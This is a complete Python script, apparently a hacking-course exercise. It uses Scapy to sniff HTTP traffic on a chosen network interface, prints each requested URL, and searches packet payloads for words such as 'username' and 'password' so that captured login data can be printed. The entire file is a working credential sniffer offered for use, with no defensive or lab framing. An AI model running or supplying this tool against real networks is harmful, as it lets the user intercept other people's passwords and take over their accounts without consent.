#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse

def getoptions():
    parser=optparse.OptionParser()
    parser.add_option("-i","--interface",dest="interface",help="Specify interface you want to sniff packets from ")
    (options,args)=parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def getURL(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def getLOGIN(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "login", "password", "pass", "user", "Username", "Uname", "Login", "Password",
                    "Pass", "User"]
        for keyword in keywords:
            if keyword in str(load):
                return load.decode("UTF-8")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=getURL(packet)
        print("[+]HTTP Request: " + url.decode("UTF-8"))
        logininfo=getLOGIN(packet)
        if(logininfo):
            print("[+]Possible Username/Password: "+ logininfo)

options=getoptions()
sniff(options.interface)
